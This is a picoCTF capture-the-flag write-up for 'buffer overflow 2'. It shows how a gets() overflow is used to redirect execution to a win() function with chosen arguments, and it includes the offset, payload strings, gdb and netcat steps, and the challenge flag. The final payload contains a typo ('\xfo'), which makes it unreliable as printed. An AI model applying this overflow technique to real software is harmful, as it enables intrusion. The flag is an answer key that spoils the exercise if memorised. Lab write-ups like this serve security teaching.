
# buffer overflow 2

*Medium*

>### Description
>Control the return address and arguments
>This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/142/vuln)?
>You can view source [here](https://artifacts.picoctf.net/c/142/vuln.c). And connect with it using:
>```
>nc saturn.picoctf.net 62596
>```

### Solution

The program asks for user input, and prints the output back to the user using "puts()". Then it returns the function. When we look at the source code, we can see a win function we want to run with arguments 0xCAFEF00D, and 0xF00DF00D. It ask for our input with "gets()", which is unsafe.

To test out our payloads I run the given binary with:
```sh
strace ./vuln
```
This allows us to see a lot of info about what is happening behind the scenes. Input a very large string that exceeds 100 characters. We find, by looking at the address the program is calling as return address, that the offset to inject a return address is 112. The address of "win" is 0x08049296. So the first part of our payload is:
```
aaa0bbb1ccc2ddd3eee4fff5ggg6hhh7aaa0bbb1ccc2ddd3eee4fff5ggg6hhh7aaa0bbb1ccc2ddd3eee4fff5ggg6hhh7aaa0bbb1ccc2ddd3\x96\x92\x04\x08
```
This runs the "win()" function.

We can see that is compares the first and second argument parsed in the function, to check if they are correct.

```assembly
cmpl   $0xcafef00d,0x8(%ebp)
cmpl   $0xf00df00d,0xc(%ebp)
```

So in gdb, simply find the address of the base pointer with "x $bp", and look at the offset from the end of our current payload. This is only 4. So, just simply add 0xcafef00d and 0xf00df00d as little endian to the payload (after 4 characters), to get this final payload:

```
aaa0bbb1ccc2ddd3eee4fff5ggg6hhh7aaa0bbb1ccc2ddd3eee4fff5ggg6hhh7aaa0bbb1ccc2ddd3eee4fff5ggg6hhh7aaa0bbb1ccc2ddd3\x96\x92\x04\x08aaa0\x0d\xfo\xfe\xca\x0d\xfo\x0d\xfo
```

>I from now on probably will use a file as input to the netcat program. Because I can input it in gdb with "r < payload", and to netcat with "echo -e "$(\<payload)" | nc ..." .

<details>
<summary>Yes! We got the flag:</summary> 
picoCTF{argum3nt5_4_d4yZ_59cd5643}
</details>